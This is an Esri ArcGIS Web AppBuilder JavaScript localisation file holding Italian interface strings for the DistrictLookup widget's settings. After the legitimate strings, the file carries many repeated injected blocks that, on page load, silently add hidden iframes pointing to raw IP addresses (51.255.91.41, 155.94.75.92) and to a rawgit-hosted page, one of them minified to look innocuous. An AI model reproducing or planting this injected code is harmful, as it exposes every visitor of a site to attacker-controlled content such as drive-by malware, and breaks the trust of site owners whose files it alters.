// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/DistrictLookup/setting/nls/strings":{units:{miles:"Miglia",kilometers:"Chilometri",feet:"Piedi",meters:"Metri"},layerSetting:{layerSettingTabTitle:"Impostazione di ricerca",buttonSet:"Imposta",selectLayersLabel:"Seleziona layer",selectLayersHintText:"Suggerimento: utilizzato per selezionare il layer poligono e il layer punto correlato.",selectPrecinctSymbolLabel:"Seleziona simbolo per evidenziare poligono",selectGraphicLocationSymbol:"Simbolo indirizzo o posizione",graphicLocationSymbolHintText:"Suggerimento: simbolo per l'indirizzo ricercato o la posizione selezionata",
precinctSymbolHintText:"Suggerimento: utilizzato per visualizzare il simbolo per il poligono selezionato",selectColorForPoint:"Seleziona colore per evidenziare punto",selectColorForPointHintText:"Suggerimento: utilizzato per visualizzare il colore evidenziazione per il punto selezionato"},searchSourceSetting:{searchSourceSettingTabTitle:"Cerca impostazioni origine",searchSourceSettingTitle:"Cerca impostazioni origine",searchSourceSettingTitleHintText:"Aggiungere e configurare servizi di geocodifica o feature layer come fonti di ricerca. Queste fonti specificate determinano ci\u00f2 che \u00e8 possibile cercare nella casella di ricerca",
addSearchSourceLabel:"Aggiungi fonte di ricerca",featureLayerLabel:"Feature layer",geocoderLabel:"Geocodificatore",nameTitle:"Nome",generalSettingLabel:"Impostazioni generali",allPlaceholderLabel:"Testo segnaposto per la ricerca in tutti:",allPlaceholderHintText:"Suggerimento: immettere il testo da visualizzare come segnaposto durante la ricerca di tutti i layer e geocodificatore",generalSettingCheckboxLabel:"Mostra popup per la feature o la posizione trovata",countryCode:"Codici paesi o regioni",
countryCodeEg:"es. ",countryCodeHint:"Se si lascia vuoto questo campo, la ricerca verr\u00e0 effettuata in tutti i paesi e le regioni",questionMark:"?",searchInCurrentMapExtent:"Esegui la ricerca nell'estensione mappa corrente",zoomScale:"Scala zoom",locatorUrl:"URL geocodificatore",locatorName:"Nome geocodificatore",locatorExample:"Esempio",locatorWarning:"Questa versione del servizio di geocodifica non \u00e8 supportata. Il widget supporta il servizio di geocodifica 10.0 e versioni successive.",
locatorTips:"I suggerimenti non sono disponibili perch\u00e9 il servizio di geocodifica non supporta tale funzionalit\u00e0.",layerSource:"Origine del layer",setLayerSource:"Imposta layer di origine",setGeocoderURL:"Imposta URL geocodificatore",searchLayerTips:"I suggerimenti non sono disponibili perch\u00e9 il feature service non supporta la funzionalit\u00e0 di paginazione.",placeholder:"Testo segnaposto",searchFields:"Campi di ricerca",displayField:"Campo visualizzazione",exactMatch:"Corrispondenza esatta",
maxSuggestions:"Suggerimenti massimi",maxResults:"Risultati massimi",enableLocalSearch:"Abilita ricerca locale",minScale:"Scala Minima",minScaleHint:"Quando la scala della mappa \u00e8 pi\u00f9 grande di questa scala, verr\u00e0 applicata la ricerca locale",radius:"Raggio",radiusHint:"Specifica il raggio di un'area intorno al centro della mappa corrente che viene utilizzato per assegnare la priorit\u00e0 alla classificazione dei candidati di geocodifica in modo che i canditati pi\u00f9 vicini alla posizione vengano restituiti per primi",
meters:"Metri",setSearchFields:"Imposta campi di ricerca",set:"Imposta",fieldName:"Nome",invalidUrlTip:"URL ${URL} non valido o non accessibile.",invalidSearchSources:"Impostazioni fonte di ricerca non valide"},layerSelector:{selectPolygonLayerLabel:"Seleziona layer poligono",selectPolygonLayerHintText:"Suggerimento: utilizzato per selezionare layer poligono.",selectRelatedPointLayerLabel:"Selezionare layer punto correlato al layer poligono",selectRelatedPointLayerHintText:"Suggerimento: utilizzato per selezionare layer punto correlato a layer poligono",
polygonLayerNotHavingRelatedLayer:"Selezionare un layer poligono con un layer punto correlato.",errorInSelectingPolygonLayer:"Selezionare un layer poligono con un layer punto correlato.",errorInSelectingRelatedLayer:"Selezionare layer punto correlato al layer poligono."},routeSetting:{routeSettingTabTitle:"Impostazioni direzioni",routeServiceUrl:"Servizio itinerario",buttonSet:"Imposta",routeServiceUrlHintText:"Suggerimento: fare clic su \u2018Imposta\u2019 per individuare e selezionare un servizio itinerario di analisi di rete",
directionLengthUnit:"Unit\u00e0 di lunghezza direzione",unitsForRouteHintText:"Suggerimento: utilizzato per visualizzare unit\u00e0 per percorso segnalate",selectRouteSymbol:"Seleziona simbolo per visualizzare percorso",routeSymbolHintText:"Suggerimento: utilizzato per visualizzare simbolo linea del percorso",routingDisabledMsg:"Per abilitare le direzioni accertarsi che gli itinerari siano abilitati nell'elemento di ArcGIS Online."},networkServiceChooser:{arcgislabel:"Aggiungi da ArcGIS Online",serviceURLabel:"Aggiungi URL del servizio",
routeURL:"URL itinerario",validateRouteURL:"Convalida",exampleText:"Esempio",hintRouteURL1:"https://route.arcgis.com/arcgis/rest/services/World/Route/NAServer/",hintRouteURL2:"https://route.arcgis.com/arcgis/rest/services/World/Route/NAServer/Route_World",invalidRouteServiceURL:"Specificare un servizio Itinerari valido.",rateLimitExceeded:"Superato limite velocit\u00e0. Riprovare pi\u00f9 tardi.",errorInvokingService:"Nome utente o password errati."},symbolPickerPreviewText:"Anteprima:",showToolToSelectLabel:"Pulsante Imposta posizione",
showToolToSelectHintText:"Suggerimento: fornisce un pulsante per impostare la posizione sulla mappa anzich\u00e9 impostare sempre la posizione quando si fa clic sulla mappa",_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});